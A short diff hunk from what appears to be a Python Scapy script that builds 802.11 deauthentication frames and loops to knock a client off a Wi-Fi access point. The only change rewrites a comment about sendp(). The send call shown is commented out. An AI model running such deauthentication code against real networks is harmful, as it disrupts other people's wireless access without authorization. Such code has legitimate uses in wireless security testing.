@@ -29,7 +29,7 @@ pkt_to_ap = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=ap)/Dot11Deauth()
 while True:
 	for i in range(50):
 		
-		### The sendp() function send packets at layer 2 (Data Link Layer), for more explanation - https://scapy.readthedocs.io/en/latest/usage.html		
+		### The sendp() function send packets at layer 2 - Data Link Layer
 		# Sending deauthentication packet from AP to client.
 		print ("Sending deauthentication packet from AP to client")
 		# sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
